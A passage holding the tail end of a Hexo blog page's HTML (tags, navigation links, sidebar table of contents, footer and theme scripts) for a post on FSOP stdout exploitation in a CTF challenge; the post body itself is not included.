+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/fsop/" rel="tag">fsop</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="https://hackmd.io/_uploads/ryiEcEr9p.png" data-sizes="auto" alt="Stack-based exploits in Linux kernel" class="lazyload">
+        
+        <a href="/2024/01/29/stack-linux-kernel/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            Stack-based exploits in Linux kernel
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="https://hackmd.io/_uploads/rJYR97M6h.png" data-sizes="auto" alt="ret2csu" class="lazyload">
+      
+      <a href="/2023/08/22/ret2csu/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          ret2csu
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FSOP-stdout"><span class="toc-number">1.</span> <span class="toc-text">FSOP stdout</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-fclose"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. fclose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IO-un-link"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. __IO_un_link</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-IO-file-close-it"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. _IO_file_close_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-puts"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. puts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Techniques"><span class="toc-number">1.2.</span> <span class="toc-text">Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-hijack-vtable"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.  hijack vtable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-leak-libc"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. leak libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-leak-libc"><span class="toc-number">1.3.</span> <span class="toc-text">How to leak libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEMO-balsn-babypwn-2023"><span class="toc-number">1.4.</span> <span class="toc-text">DEMO balsn babypwn 2023</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-pivot-to-bss"><span class="toc-number">1.4.1.</span> <span class="toc-text">Stack pivot to bss:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recap"><span class="toc-number">1.4.2.</span> <span class="toc-text">Recap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credit"><span class="toc-number">1.5.</span> <span class="toc-text">Credit</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">8</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2024
+      <span class="footer-info-sep"></span>
+      whoisthatguy
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        13.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:19
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FSOP-stdout"><span class="toc-number">1.</span> <span class="toc-text">FSOP stdout</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-fclose"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. fclose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IO-un-link"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. __IO_un_link</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-IO-file-close-it"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. _IO_file_close_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-puts"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. puts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Techniques"><span class="toc-number">1.2.</span> <span class="toc-text">Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-hijack-vtable"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.  hijack vtable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-leak-libc"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. leak libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-leak-libc"><span class="toc-number">1.3.</span> <span class="toc-text">How to leak libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEMO-balsn-babypwn-2023"><span class="toc-number">1.4.</span> <span class="toc-text">DEMO balsn babypwn 2023</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-pivot-to-bss"><span class="toc-number">1.4.1.</span> <span class="toc-text">Stack pivot to bss:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recap"><span class="toc-number">1.4.2.</span> <span class="toc-text">Recap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credit"><span class="toc-number">1.5.</span> <span class="toc-text">Credit</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">8</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+
+
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
